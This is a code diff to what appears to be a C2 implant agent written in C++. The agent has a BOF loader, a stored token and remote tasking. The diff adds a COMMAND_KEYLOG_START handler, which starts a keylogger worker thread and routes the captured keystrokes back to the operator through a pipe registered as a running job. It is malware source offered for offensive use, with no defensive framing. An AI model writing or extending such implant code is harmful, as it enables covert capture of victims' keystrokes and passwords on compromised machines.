@@ -1,6 +1,7 @@
 #include "Commander.h"
 #include "bof_loader.h"
 #include "Boffer.h"
+#include "Keylogger.h"
 
 extern HANDLE g_StoredToken;
 
@@ -142,6 +143,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 
 		case COMMAND_UPLOAD:
 			this->CmdUpload(CommandId, inPacker, outPacker); break;
+
+		case COMMAND_KEYLOG_START:
+			this->CmdKeylogStart(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_SAVEMEMORY:
 			this->CmdSaveMemory(CommandId, inPacker, outPacker); break;
@@ -1190,6 +1194,48 @@ void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
 }
 
 
+
+void Commander::CmdKeylogStart(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG pollMs = inPacker->Unpack32();
+	ULONG taskId = inPacker->Unpack32();
+
+	if (pollMs < 10)
+		pollMs = 100;
+
+	HANDLE pipeRead  = NULL;
+	HANDLE pipeWrite = NULL;
+	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+	ApiWin->CreatePipe(&pipeRead, &pipeWrite, &sa, 0);
+
+	if (!pipeRead || !pipeWrite) {
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(TEB->LastErrorValue);
+		return;
+	}
+
+	KeylogConfig* cfg = (KeylogConfig*)MemAllocLocal(sizeof(KeylogConfig));
+	cfg->pipeWrite      = pipeWrite;
+	cfg->active         = 1;
+	cfg->pollIntervalMs = pollMs;
+
+	HANDLE hThread = ApiWin->CreateThread(NULL, 0, KeylogWorker, cfg, 0, NULL);
+	if (!hThread) {
+		ApiNt->NtClose(pipeRead);
+		ApiNt->NtClose(pipeWrite);
+		MemFreeLocal((LPVOID*)&cfg, sizeof(KeylogConfig));
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(TEB->LastErrorValue);
+		return;
+	}
+
+	agent->jober->CreateJobData(taskId, JOB_TYPE_LOCAL, JOB_STATE_RUNNING, hThread, 0, pipeRead, pipeWrite);
+
+	outPacker->Pack32(taskId);
+	outPacker->Pack32(commandId);
+}
 
 void Commander::CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
